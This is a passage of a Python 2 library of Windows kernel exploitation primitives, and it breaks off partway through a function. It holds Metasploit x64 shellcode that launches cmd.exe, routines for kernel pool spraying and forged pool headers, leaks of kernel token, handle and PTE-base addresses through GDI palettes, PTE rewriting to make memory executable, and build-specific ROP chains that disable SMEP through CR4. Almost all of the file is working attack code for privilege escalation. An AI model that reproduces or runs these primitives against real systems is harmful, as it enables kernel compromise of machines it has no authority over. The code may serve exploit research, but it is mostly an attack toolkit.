import sys
import os
import struct
import platform
import signal
from subprocess import check_output
from ctypes import *
from ctypes.wintypes import *

#########################################################################################
#######################################Shellcodes########################################
#########################################################################################


# /*
#  * windows/x64/exec - 275 bytes
#  * http://www.metasploit.com
#  * VERBOSE=false, PrependMigrate=false, EXITFUNC=thread,
#  * CMD=cmd.exe
#  */
SHELLCODE_EXEC_CMD_X64 = (
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64"
"\x2e\x65\x78\x65\x00")

#########################################################################################
######################################Common structs#####################################
#########################################################################################

ULONG_PTR = PVOID = LPVOID = PVOID64 = c_void_p
PROCESSINFOCLASS = DWORD
ULONG = c_uint32
PULONG = POINTER(ULONG)
NTSTATUS = DWORD
HPALETTE = HANDLE
QWORD = c_ulonglong
CHAR = c_char
KAFFINITY = ULONG_PTR
SDWORD = c_int32


#to be filled properly
class PEB(Structure):
	_fields_ = [
		("Stuff", c_byte * 0xF8),
		("GdiSharedHandleTable", PVOID)
	]

#source: https://msdn.microsoft.com/en-us/library/windows/desktop/ms684280(v=vs.85).aspx
class PROCESS_BASIC_INFORMATION(Structure):
	_fields_ = [
		("Reserved1", PVOID),
		("PebBaseAddress", POINTER(PEB)),
		("Reserved2", PVOID * 2),
		("UniqueProcessId", ULONG_PTR),
		("Reserved3", PVOID)
	]

#source: https://www.ekoparty.org/archivo/2015/eko11-Abusing_GDI.pdf
class GDICELL64(Structure):
	_fields_ = [
		("pKernelAddress", PVOID64),
		("wProcessId", USHORT), 
		("wCount", USHORT),
		("wUpper", USHORT),
		("wType", USHORT),
		("pUserAddress", PVOID64)
	]

#source: https://msdn.microsoft.com/en-us/library/windows/desktop/ms646340(v=vs.85).aspx
class ACCEL(Structure):
	_fields_ = [
		("fVirt", BYTE),
		("key", WORD), 
		("cmd", WORD)
	]

class ACCEL_ARRAY(Structure):
	_fields_ = [
		("ACCEL_ARRAY", POINTER(ACCEL) * 675)
	]
	
WNDPROCTYPE = WINFUNCTYPE(c_int, HWND, c_uint, WPARAM, LPARAM)
#WNDPROC  = WINFUNCTYPE(LPVOID, HWND, UINT, WPARAM, LPARAM)

#Windows 10x64 v1703
class WNDCLASSEX(Structure):
	_fields_ = [
		("cbSize", c_uint),
		("style", c_uint),
		("lpfnWndProc", WNDPROCTYPE),
		("cbClsExtra", c_int),
		("cbWndExtra", c_int),
		("hInstance", HANDLE),
		("hIcon", HANDLE),
		("hCursor", HANDLE),
		("hBrush", HANDLE),
		("lpszMenuName", LPCWSTR),
		("lpszClassName", LPCWSTR),
		("hIconSm", HANDLE)
	]

class PALETTEENTRY(Structure):
	_fields_ = [
		("peRed", BYTE),
		("peGreen", BYTE),
		("peBlue", BYTE),
		("peFlags", BYTE)
	]

class LOGPALETTE(Structure):
	_fields_ = [
		("palVersion", WORD),
		("palNumEntries", WORD),
		("palPalEntry", POINTER(PALETTEENTRY))
	]

class LSA_UNICODE_STRING(Structure):
	"""Represent the LSA_UNICODE_STRING on ntdll."""
	_fields_ = [
		("Length", USHORT),
		("MaximumLength", USHORT),
		("Buffer", LPWSTR)
	]

class PUBLIC_OBJECT_TYPE_INFORMATION(Structure):
	_fields_ = [
		("Name", LSA_UNICODE_STRING),
		("Reserved", ULONG * 22)
	]
	
class SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX(Structure):
	"""Represent the SYSTEM_HANDLE_TABLE_ENTRY_INFO on ntdll."""
	_fields_ = [
		("Object", PVOID),
		("UniqueProcessId", PVOID),
		("HandleValue", PVOID),
		("GrantedAccess", ULONG),
		("CreatorBackTraceIndex", USHORT),
		("ObjectTypeIndex", USHORT),
		("HandleAttributes", ULONG),
		("Reserved", ULONG),
	]
 
class SYSTEM_HANDLE_INFORMATION_EX(Structure):
	"""Represent the SYSTEM_HANDLE_INFORMATION on ntdll."""
	_fields_ = [
		("NumberOfHandles", PVOID),
		("Reserved", PVOID),
		("Handles", SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX * 1),
	]

class PROCESSENTRY32(Structure):
	"""Describes an entry from a list of the processes residing in the system
	   address space when a snapshot was taken."""
	_fields_ = [ ( 'dwSize' , DWORD ) ,
				 ( 'cntUsage' , DWORD) ,
				 ( 'th32ProcessID' , DWORD) ,
				 ( 'th32DefaultHeapID' , POINTER(ULONG)) ,
				 ( 'th32ModuleID' , DWORD) ,
				 ( 'cntThreads' , DWORD) ,
				 ( 'th32ParentProcessID' , DWORD) ,
				 ( 'pcPriClassBase' , LONG) ,
				 ( 'dwFlags' , DWORD) ,
				 ( 'szExeFile' , CHAR * MAX_PATH ) 
	] 

class CLIENT_ID(Structure):
	_fields_ = [
		("UniqueProcess",   PVOID),
		("UniqueThread",	PVOID),
]

class THREAD_BASIC_INFORMATION(Structure):
	_fields_ = [
		("ExitStatus",	  NTSTATUS),
		("TebBaseAddress",  PVOID),	 # PTEB
		("ClientId",		CLIENT_ID),
		("AffinityMask",	KAFFINITY),
		("Priority",		SDWORD),
		("BasePriority",	SDWORD),
	]

#########################################################################################
###################################Function definitions##################################
#########################################################################################

Psapi	= windll.Psapi
kernel32 = windll.kernel32
ntdll = windll.ntdll
gdi32 = windll.gdi32
shell32 = windll.shell32
user32 = windll.user32
advapi32 = windll.advapi32

gdi32.CreatePalette.argtypes = [LPVOID]
gdi32.CreatePalette.restype = HPALETTE

gdi32.GetPaletteEntries.argtypes = [HPALETTE, UINT, UINT, LPVOID]
gdi32.GetPaletteEntries.restype = UINT

gdi32.SetPaletteEntries.argtypes = [HPALETTE, UINT, UINT, LPVOID]
gdi32.SetPaletteEntries.restype = UINT

gdi32.SetBitmapBits.argtypes = [HBITMAP, DWORD, LPVOID]
gdi32.SetBitmapBits.restype = LONG

gdi32.GetBitmapBits.argtypes = [HBITMAP, LONG, LPVOID]
gdi32.GetBitmapBits.restype = LONG

gdi32.CreateBitmap.argtypes = [c_int, c_int, UINT, UINT, c_void_p]
gdi32.CreateBitmap.restype = HBITMAP

ntdll.NtQueryInformationProcess.argtypes = [HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG]
ntdll.NtQueryInformationProcess.restype = NTSTATUS

ntdll.NtQueryObject.argtypes = [HANDLE, DWORD, POINTER(PUBLIC_OBJECT_TYPE_INFORMATION), ULONG, POINTER(ULONG)]
ntdll.NtQueryObject.restype = NTSTATUS

ntdll.NtQuerySystemInformation.argtypes = [DWORD, POINTER(SYSTEM_HANDLE_INFORMATION_EX), ULONG, POINTER(ULONG)]
ntdll.NtQuerySystemInformation.restype = NTSTATUS

kernel32.GetProcAddress.restype = c_ulonglong
kernel32.GetProcAddress.argtypes = [HMODULE, LPCSTR]

kernel32.OpenProcess.argtypes = [DWORD, BOOL, DWORD]
kernel32.OpenProcess.restype = HANDLE

kernel32.GetCurrentProcess.restype = HANDLE												

kernel32.WriteProcessMemory.argtypes = [HANDLE, LPVOID, LPCSTR, DWORD, POINTER(LPVOID)]
kernel32.WriteProcessMemory.restype = BOOL						   

kernel32.VirtualAllocEx.argtypes = [HANDLE, LPVOID, DWORD, DWORD, DWORD]
kernel32.VirtualAllocEx.restype = LPVOID

kernel32.CreateRemoteThread.argtypes = [HANDLE, QWORD, UINT, QWORD, LPVOID, DWORD, POINTER(HANDLE)]
kernel32.CreateRemoteThread.restype = BOOL

kernel32.GetCurrentThread.argtypes = []
kernel32.GetCurrentThread.restype = HANDLE

advapi32.OpenProcessToken.argtypes = [HANDLE, DWORD , POINTER(HANDLE)]
advapi32.OpenProcessToken.restype = BOOL

kernel32.CreateToolhelp32Snapshot.argtypes = [DWORD, DWORD]
kernel32.CreateToolhelp32Snapshot.restype = HANDLE

kernel32.DeviceIoControl.argtypes = [HANDLE, DWORD, c_void_p, DWORD, c_void_p, DWORD, c_void_p, c_void_p]
kernel32.DeviceIoControl.restype = BOOL

ntdll.NtQueryInformationThread.argtypes = [HANDLE, DWORD, POINTER(THREAD_BASIC_INFORMATION), ULONG, POINTER(ULONG)]
ntdll.NtQueryInformationThread.restype = NTSTATUS

#########################################################################################
######################################Common constants###################################
#########################################################################################

# THREAD_INFORMATION_CLASS
ThreadBasicInformation = 0

# PROCESS_INFORMATION_CLASS
ProcessBasicInformation = 0 #Retrieves a pointer to a PEB structure that can be used to determine whether the specified process is being debugged, and a unique value used by the system to identify the specified process. It is best to use the CheckRemoteDebuggerPresent and GetProcessId functions to obtain this information.
ProcessDebugPort = 7 #Retrieves a DWORD_PTR value that is the port number of the debugger for the process. A nonzero value indicates that the process is being run under the control of a ring 3 debugger. It is best to use the CheckRemoteDebuggerPresent or IsDebuggerPresent function.
ProcessWow64Information = 26 #Determines whether the process is running in the WOW64 environment (WOW64 is the x86 emulator that allows Win32-based applications to run on 64-bit Windows). It is best to use the IsWow64Process function to obtain this information.
ProcessImageFileName = 27 # Retrieves a UNICODE_STRING value containing the name of the image file for the process. It is best to use the QueryFullProcessImageName or GetProcessImageFileName function to obtain this information.
ProcessBreakOnTermination = 29 #Retrieves a ULONG value indicating whether the process is considered critical. Note  This value can be used starting in Windows XP with SP3. Starting in Windows 8.1, IsProcessCritical should be used instead.
ProcessSubsystemInformation = 75#Retrieves a SUBSYSTEM_INFORMATION_TYPE value indicating the subsystem type of the process. The buffer pointed to by the ProcessInformation parameter should be large enough to hold a single SUBSYSTEM_INFORMATION_TYPE enumeration.

ObjectBasicInformation = 0
ObjectTypeInformation = 2

SystemExtendedHandleInformation = 64

VER_NT_WORKSTATION 			= 1 # The system is a workstation.
VER_NT_DOMAIN_CONTROLLER	= 2	# The system is a domain controller.
VER_NT_SERVER				= 3	# The system is a server, but not a domain controller.

GENERIC_READ  = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 0x3

MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x00000040
VIRTUAL_MEM  = ( 0x1000 | 0x2000 )

STATUS_SUCCESS = 0
STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
STATUS_BUFFER_OVERFLOW = 0x80000005L
STATUS_INVALID_HANDLE = 0xC0000008L
STATUS_BUFFER_TOO_SMALL = 0xC0000023L 

PROCESS_ALL_ACCESS = ( 0x000F0000 | 0x00100000 | 0xFFF )
TOKEN_ALL_ACCESS = 0xf00ff

FILE_DEVICE_UNKNOWN = 0x00000022

METHOD_BUFFERED		= 0x0
METHOD_IN_DIRECT	= 0x1
METHOD_OUT_DIRECT	= 0x2
METHOD_NEITHER		= 0x3

FILE_READ_DATA		= 0x1
FILE_WRITE_DATA 	= 0x2
FILE_ANY_ACCESS		= 0x0

FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000
NULL = 0x0

INVALID_HANDLE_VALUE = -1

TH32CS_SNAPPROCESS = 0x02

class x_file_handles(Exception):
	pass

#########################################################################################
###################This section contains sysinfo related functions#######################
#########################################################################################

def get_kuser_shared_data():
	"""
	This function returns the static address of KUSER_SHARED_DATA
	@return: address of KUSER_SHARED_DATA
	"""
	if platform.architecture()[0] == '64bit':
		return 0xFFFFF78000000000
	elif platform.architecture()[0] == '32bit':
		return 0x7FFE0000

#source: https://github.com/tjguk/winsys/blob/master/random/file_handles.py
def signed_to_unsigned(signed):
	"""
	Convert signed to unsigned
	@param signed: the value to be converted
	"""
	unsigned = struct.unpack("L", struct.pack("l", signed))
	return unsigned

#source: https://github.com/tjguk/winsys/blob/master/random/file_handles.py + https://www.exploit-db.com/exploits/34272/
def get_type_info(handle):
	"""
	Get the handle type information.
	@param handle: handle of the object
	"""
	public_object_type_information = PUBLIC_OBJECT_TYPE_INFORMATION()
	size = DWORD(sizeof(public_object_type_information))
	while True:
		result = ntdll.NtQueryObject(handle, ObjectTypeInformation, byref(public_object_type_information), size, None)
		if result == STATUS_SUCCESS:
			return public_object_type_information.Name.Buffer
		elif result == STATUS_INFO_LENGTH_MISMATCH:
			size = DWORD(size.value * 4)
			resize(public_object_type_information, size.value)
		elif result == STATUS_INVALID_HANDLE:
			print "[-] INVALID HANDLE: %s, exiting..." % hex(handle)
			sys.exit(-1)
		else:
			raise x_file_handles("NtQueryObject", hex(result))

#source: https://github.com/tjguk/winsys/blob/master/random/file_handles.py + https://www.exploit-db.com/exploits/34272/
def get_handles():
	""" Return all the open handles in the system """
	system_handle_information = SYSTEM_HANDLE_INFORMATION_EX()
	size = DWORD (sizeof(system_handle_information))
	while True:
		result = ntdll.NtQuerySystemInformation(
			SystemExtendedHandleInformation,
			byref(system_handle_information),
			size,
			byref(size)
		)
		if result == STATUS_SUCCESS:
			break
		elif result == STATUS_INFO_LENGTH_MISMATCH:
			size = DWORD(size.value * 4)
			resize(system_handle_information, size.value)
		else:
			raise x_file_handles("NtQuerySystemInformation", hex(result))

	pHandles = cast(
		system_handle_information.Handles,
		POINTER(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX * \
				system_handle_information.NumberOfHandles)
	)
	for handle in pHandles.contents:
		yield handle.UniqueProcessId, handle.HandleValue, handle.Object

def token_address_of_process(h_process, process_id):
	"""
	Function to get the address of the token belonging to a process
	@param h_process: handle to the process
	@param process_id: PID of the same process
	@return: address of the token
	"""
	token_handle = HANDLE()
	if not advapi32.OpenProcessToken(h_process,TOKEN_ALL_ACCESS, byref(token_handle)):
		print "[-] Could not open process token of process %s, exiting..." % pid
		sys.exit()

	print "[*] Leaking token addresses from kernel space..."
	for pid, handle, obj in get_handles():
		if pid == process_id and get_type_info(handle) == "Token":
			if token_handle.value == handle:
				print "[+] PID: %s token address: %x" % (str(process_id), obj)
				return obj

def get_teb_base():
	"""
	Function to get the TEB base address
	@return: teb base address
	"""
	print "[*] Getting TEB base address"
	h_thread = kernel32.GetCurrentThread()
	tbi = THREAD_BASIC_INFORMATION()
	len = c_ulonglong()
	result = ntdll.NtQueryInformationThread(h_thread, ThreadBasicInformation, byref(tbi), sizeof(tbi), None)
	if result == STATUS_SUCCESS:
		teb_base = tbi.TebBaseAddress
		print "[+] TEB base address: %s" % hex(teb_base)
		return teb_base
	else:
		print "[-] Something wen wrong, exiting..."
		sys.exit(-1)

def kernel_address_of_handle(h, process_id):
	"""
	Function to get the address of the handle
	@param h: handle to the object
	@param process_id: PID of the process
	@return: address of the handle
	"""
	print "[*] Leaking handle addresses from kernel space..."
	for pid, handle, obj in get_handles():
		#print hex(handle)
		if pid == process_id and handle == h:
			print "[+] PID: %s handle %s address: %x" % (str(process_id), handle, obj)
			return obj

def getpid(procname):
	"""
	Get Process Pid by procname
	@param procname: the name of the process to find
	@return: PID
	"""
	pid = None
	try:
		hProcessSnap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
		pe32 = PROCESSENTRY32()
		pe32.dwSize = sizeof(PROCESSENTRY32)
		ret = kernel32.Process32First(hProcessSnap , byref(pe32))
		while ret:
			if pe32.szExeFile == LPSTR(procname).value:
				pid = pe32.th32ProcessID
			ret = kernel32.Process32Next(hProcessSnap, byref(pe32))
		kernel32.CloseHandle ( hProcessSnap )
	except Exception, e:
		print "[-] Error: %s" % str(e)
	if not pid:
		print "[-] Could not find %s PID" % procname
		sys.exit()
	return pid

#########################################################################################
###############This section contains kernel pool spraying related functions##############
#########################################################################################


kernel_object_sizes = {}

#sizes of various kernel objects
kernel_object_sizes['unnamed_mutex'] = 0x50
kernel_object_sizes['unnamed_job'] = 0x168
kernel_object_sizes['iocompletionreserve'] = 0x60
kernel_object_sizes['unnamed_semaphore'] = 0x48
kernel_object_sizes['event'] = 0x40

pool_object_handles = []

#the first 0x28 bytes in the pool allocation, which will allow an overwrite
#the previous size and and the TypeIndex is set zero
pool_object_headers = {}
pool_object_headers['unnamed_mutex'] = [0x040a0000,0xe174754d,0x00000000,0x00000050,0x00000000,0x00000000,0x00000001,0x00000001,0x00000000,0x00080000]
pool_object_headers['unnamed_job'] = [0x042d0000,0xa0626f4a,0x00000000,0x00000168,0x0000006c,0x86e0bd80,0x00000001,0x00000001,0x00000000,0x00080000]
pool_object_headers['iocompletionreserve'] = [0x040c0000,0xef436f49,0x00000000,0x0000005c,0x00000000,0x00000000,0x00000001,0x00000001,0x00000000,0x00080000]
pool_object_headers['unnamed_semaphore'] = [0x04090000,0xe16d6553,0x00000000,0x00000044,0x00000000,0x00000000,0x00000001,0x00000001,0x00000000,0x00080000]
pool_object_headers['event'] = [0x04080000,0xee657645,0x00000000,0x00000040,0x00000000,0x00000000,0x00000001,0x00000001,0x00000000,0x00080000]

"""
#The original typeindex (in case I need it later)
original_typeindex = {}
original_typeindex['unnamed_mutex'] = 0xe
original_typeindex['unnamed_job'] = 0x6
original_typeindex['iocompletionreserve'] = 0xa
original_typeindex['unnamed_semaphore'] = 0x10
original_typeindex['event'] = 0xc
"""

SPRAY_COUNT = 50000

def allocate_object(object_to_use, variance):
	"""
	Allocate an object based on the input
	@param object_to_use: name of the object to allocate
	@param variance: extra string to use (typically a number) for named objects
	@return: the handle to the object
	"""
	hHandle = HANDLE(0)
	if object_to_use == 'unnamed_mutex':
		hHandle = kernel32.CreateMutexA(None, False, None)
	elif object_to_use == 'named_mutex':
		hHandle = kernel32.CreateMutexA(None, False, "Pool spraying is cool %s" % variance)
	elif object_to_use == 'unnamed_job':
		hHandle = kernel32.CreateJobObjectA(None, None)
	elif object_to_use == 'named_job':
		hHandle = kernel32.CreateJobObjectA(None, "Job %s" % variance)
	elif object_to_use == 'iocompletionport':
		hHandle = kernel32.CreateIoCompletionPort(-1, None, 0, 0)
	elif object_to_use == 'iocompletionreserve':
		IO_COMPLETION_OBJECT = 1
		ntdll.NtAllocateReserveObject(byref(hHandle), 0x0, IO_COMPLETION_OBJECT)
		hHandle = hHandle.value
	elif object_to_use == 'unnamed_semaphore':
		hHandle = kernel32.CreateSemaphoreA(None, 0, 3, None)
	elif object_to_use == 'named_semaphore':
		hHandle = kernel32.CreateSemaphoreA(None, 0, 3, "My little Semaphore %s" % variance)
	elif object_to_use == 'event':
		hHandle = kernel32.CreateEventA(None, False, False, None)
	if hHandle == None:
		print "[-] Error while creating object: %s" % object_to_use
		sys.exit(-1)
	return hHandle

def find_object_to_spray(required_hole_size):
	"""
	Calculates which object to use for kernel pool spraying
	@param required_hole_size: the required hole size in kernel pool, which will be overflown
	@return: the object to use for creating the hole size
	"""
	for key in kernel_object_sizes:
		if required_hole_size % kernel_object_sizes[key] == 0:
			print "[+] Found a good object to spray with: %s" % key
			return key
	print "[-] Couldn't find proper object to spray with"
	sys.exit()

def spray(required_hole_size):
	"""
	Spray the heap with objects which will allow us to create the required holes later
	@param required_hole_size: : the required hole size in kernel pool, which will be overflown
	@return: object type (name) to use for overflow
	"""
	global pool_object_handles
	good_object = find_object_to_spray(required_hole_size)
	for i in range(SPRAY_COUNT):
		pool_object_handles.append(allocate_object(good_object, i))
	print "[+] Spray done!"
	return good_object

def make_hole(required_hole_size, good_object):
	"""
	Making holes in the sprayd kernel
	@param required_hole_size: the required hole size in kernel pool, which will be overflown
	@param good_object: object type (name) to use for overflow
	"""
	global pool_object_handles
	nr_to_free = required_hole_size / kernel_object_sizes[good_object]
	for i in range(0, SPRAY_COUNT,16):
		for j in range(0,nr_to_free):
			kernel32.CloseHandle(pool_object_handles[i + j])
			pool_object_handles[i + j] = None
	print "[+] Making holes done!"

def gimme_the_hole(required_hole_size):
	"""
	Spray and make holes
	@param required_hole_size: the required hole size in kernel pool, which will be overflown
	"""
	good_object = spray(required_hole_size)
	make_hole(required_hole_size, good_object)
	return good_object

def close_all_handles():
	"""
	Close all handles, which were used for kernel pool spraying
	"""
	print "[+] Triggering shellcode!"
	global pool_object_handles
	for i in range(0, SPRAY_COUNT):
		if (pool_object_handles[i] != None):
			kernel32.CloseHandle(pool_object_handles[i])
			pool_object_handles[i] = None
	print "[+] Free pool allocations done!"

def calculate_previous_size(required_hole_size):
	"""
	Calculate the previous size value for the pool header
	The PreviousSize value * 8 = previous chunk
	@param required_hole_size: the required hole size in kernel pool, which will be overflown
	@return: the previous_size value to be used on the POOL_HEADER
	"""
	if platform.architecture()[0] == '64bit':
		return required_hole_size/16
	elif platform.architecture()[0] == '32bit':
		return required_hole_size/8
	else:
		print "[-] Couldn't determine the Windows architecture, exiting..."
		sys.exit(-1)

def pool_overwrite(required_hole_size,good_object):
	"""
	This function will give us the data (POOL_HEADER + part of OBJECT_HEADER) to be used for the pool overwrite
	@param required_hole_size: the required hole size in kernel pool, which will be overflown
	@param good_object: object type (name) to use for overflow
	"""
	header = ''
	for i in range(len(pool_object_headers[good_object])):
		if i == 0:
			#for the first entry we need to calculate the previous pool size value, as it's required
			header += struct.pack("L",pool_object_headers[good_object][0] + calculate_previous_size(required_hole_size))
		else:
			header += struct.pack("L",pool_object_headers[good_object][i])
	return header

#########################################################################################
######################This section contains PTE related functions########################
#########################################################################################

def get_pxe_address_x64(virtual_address, pte_base):
	"""
	The functions gives the PTE address for a virtual address
	Based on: https://www.coresecurity.com/system/files/publications/2016/05/Windows%20SMEP%20bypass%20U%3DS.pdf
	@param virtual_address: the virtual address to convert
	@param pte_base: the base address for PTE
	"""
	pte_address = virtual_address >> 9
	pte_address = pte_address | pte_base
	pte_address = pte_address & (pte_base + 0x0000007ffffffff8)
	return pte_address

def get_pxe_address_x32(virtual_address, pte_base):
	"""
	The functions gives the PTE address for a virtual address
	@param virtual_address: the virtual address to convert
	@param pte_base: the base address for PTE
	"""
	pte_address = virtual_address >> 9
	pte_address = pte_address | pte_base
	pte_address = pte_address & (pte_base + 0x007FFFF8)
	return pte_address

def get_pte_base_old_x64():
	""" Returns the PTE base address for older version of Windows (prior 1607 / Redstone 1 / Anniversary Update) """
	return 0xFFFFF68000000000

def get_pte_base_old_x32():
	""" Returns the PTE base address for older version of Windows (prior 1607 / Redstone 1 / Anniversary Update) """
	return 0xC0000000

def leak_pte_base_palette(manager_palette, worker_palette):
	"""
	Based on:
	https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Pointer-Leak.ps1
	and
	https://www.blackhat.com/docs/us-17/wednesday/us-17-Schenk-Taking-Windows-10-Kernel-Exploitation-To-The-Next-Level%E2%80%93Leveraging-Write-What-Where-Vulnerabilities-In-Creators-Update-wp.pdf
	Function to leak the PTE base from the nt!MiGetPteAddress function
	@param manager_platte: handle to the manager palette
	@param worker_platte: handle to the worker palette
	@return: PTE base
	"""
	print "[*] Locating PTE base..."
	#get the MmFreeNonCachedMemory address
 	if platform.architecture()[0] == '64bit':
		kernel32.LoadLibraryExA.restype = c_uint64
		kernel32.GetProcAddress.argtypes = [c_uint64, POINTER(c_char)]
		kernel32.GetProcAddress.restype = c_uint64
	#(krnlbase, kernelver) = find_driver_base()
	krnlbase = leak_nt_base_palette(manager_palette, worker_palette)
	kernelver = ['ntoskrnl.exe','ntkrnlmp.exe','ntkrnlpa.exe','ntkrpamp.exe']
	for k in kernelver:
		print "[+] Loading %s in userland" % k
		hKernel = kernel32.LoadLibraryExA(k, 0, 1)
		if hKernel != 0:
			print "[+] %s base address : %s" % (k, hex(hKernel))
			break
	if hKernel == 0:
		print "[-] Couldn't load kernel, exiting..."
		sys.exit(-1)
	MmFreeNonCachedMemory = kernel32.GetProcAddress(hKernel, 'MmFreeNonCachedMemory')
	MmFreeNonCachedMemory -= hKernel
	MmFreeNonCachedMemory += krnlbase
	print "[+] MmFreeNonCachedMemory address: %s" % hex(MmFreeNonCachedMemory)
	#use palettes to find the MiGetPteAddress by searching the CALL function in MmFreeNonCachedMemory
	#e.g.: fffff802`3c6ba4d7 e8fc059bff	  call	nt!MiGetPteAddress (fffff802`3c06aad8)
	MmFreeNonCachedMemory_data = create_string_buffer(0x100)
	read_memory_palette(manager_palette, worker_palette, MmFreeNonCachedMemory, byref(MmFreeNonCachedMemory_data), sizeof(MmFreeNonCachedMemory_data))
	#loop through the function data and search for the first call (e8)
	for i in range(sizeof(MmFreeNonCachedMemory_data)):
		if MmFreeNonCachedMemory_data.raw[i] == '\xe8':
			offset = 0x100000000 - struct.unpack("L",MmFreeNonCachedMemory_data.raw[i+1:i+5])[0]
			MiGetPteAddress_address = MmFreeNonCachedMemory - offset + 5 + i
			print "[+] MiGetPteAddress address: %s" % hex(MiGetPteAddress_address)
			break
	"""
	nt!MiGetPteAddress:
	fffff802`3c06aad8 48c1e909		shr	 rcx,9
	fffff802`3c06aadc 48b8f8ffffff7f000000 mov rax,7FFFFFFFF8h
	fffff802`3c06aae6 4823c8		  and	 rcx,rax
	fffff802`3c06aae9 48b80000000000baffff mov rax,0FFFFBA0000000000h
	"""
	pte_base = c_ulonglong()
	read_memory_palette(manager_palette, worker_palette, MiGetPteAddress_address + 0x13, byref(pte_base), sizeof(pte_base))
	print "[+] PTE base: %s" % hex(pte_base.value)
	return pte_base.value


def make_memory_executable_palette(manager_palette, worker_palette, virtual_address):
	"""
	Function to change an address to executable with palettes
	based on: https://www.blackhat.com/docs/us-17/wednesday/us-17-Schenk-Taking-Windows-10-Kernel-Exploitation-To-The-Next-Level%E2%80%93Leveraging-Write-What-Where-Vulnerabilities-In-Creators-Update-wp.pdf
	@param manager_platte: handle to the manager palette
	@param worker_platte: handle to the worker palette
	"""
	pte_base = leak_pte_base_palette(manager_palette, worker_palette)
	pte_address = get_pxe_address_x64(virtual_address, pte_base)
	current_pte_value = c_ulonglong()
	read_memory_palette(manager_palette, worker_palette, pte_address, byref(current_pte_value), sizeof(current_pte_value))
	tobe_pte_value = c_ulonglong(current_pte_value.value & 0x0fffffffffffffff)
	write_memory_palette(manager_palette, worker_palette, pte_address, byref(tobe_pte_value), sizeof(tobe_pte_value));

#########################################################################################
#################This section contains SMEP bypass related functions#####################
#########################################################################################

def get_smep_rop1_offsets():
	"""
	This function returns offsets to support the ROP chain which change the value in CR4
	@return: offsets
	"""
	p = platform.platform()
	if p == 'Windows-10-10.0.16299':
		pop_rcx_ret = 0x160580
		mov_cr4_rcx_ret = 0x41f901
	elif p == 'Windows-8.1-6.3.9600':
		pop_rcx_ret = 0x20b29
		mov_cr4_rcx_ret = 0x8655a
	else:
		print "[-] Offsets are not currently available for this platform, exiting..."
		sys.exit(-1)
	return (pop_rcx_ret, mov_cr4_rcx_ret)

def get_smep_rop2_offsets():
	"""
	This function returns offsets to support the ROP chain which sets a user mode page to be in kernel (supervisory)
	@return: offsets
	"""
	p = platform.platform()
	if p == 'Windows-10-10.0.16299':
		pop_rcx_ret = 0x23ed				#s hal L7f000 59 c3
		pop_rax_ret = 0xbb9e				#s hal L7f000 58 c3
		mov_byte_ptr_rax_cl_ret = 0x9820	#s hal L7f000 88 08
		wbinvd_ret = 0x415f0				#s hal L7f000 0f 09 c3
	else:
		print "[-] Offsets are not currently available for this platform, exiting..."
		sys.exit(-1)
	return (pop_rcx_ret, pop_rax_ret, mov_byte_ptr_rax_cl_ret, wbinvd_ret)

def disable_smep_cr4_rop(kernel_base, return_address):
	"""
	This function creates a ROP chain to disable SMEP in the CR4 register
	@param kernel_base: base address of the kernel
	@param return_address: address to return to after the ROP chain completes
	@return: ROP chain
	"""
	(pop_rcx_ret, mov_cr4_rcx_ret) = get_smep_rop1_offsets()
	rop =  struct.pack("<Q", kernel_base+pop_rcx_ret)		# pop rcx ; ret
	rop += struct.pack("<Q", 0x506f8)					# (popped into rcx)
	rop += struct.pack("<Q", kernel_base+mov_cr4_rcx_ret)		# mov cr4, rcx ; ret
	if return_address != None:
		rop += struct.pack("<Q", return_address)			# (return into shellcode)
	return rop

def enable_smep_cr4_rop(kernel_base, return_address):
	"""
	This function creates a ROP chain to enable SMEP in the CR4 register
	@param kernel_base: base address of the kernel
	@param return_address: address to return to after the ROP chain completes
	@return: ROP chain
	"""
	(pop_rcx_ret, mov_cr4_rcx_ret) = get_smep_rop1_offsets()
	rop =  struct.pack("<Q", kernel_base+pop_rcx_ret)		# pop rcx ; ret
	rop += struct.pack("<Q", 0x1506f8)					# (popped into rcx)
	rop += struct.pack("<Q", kernel_base+mov_cr4_rcx_ret)		# mov cr4, rcx ; ret
	if return_address != None:
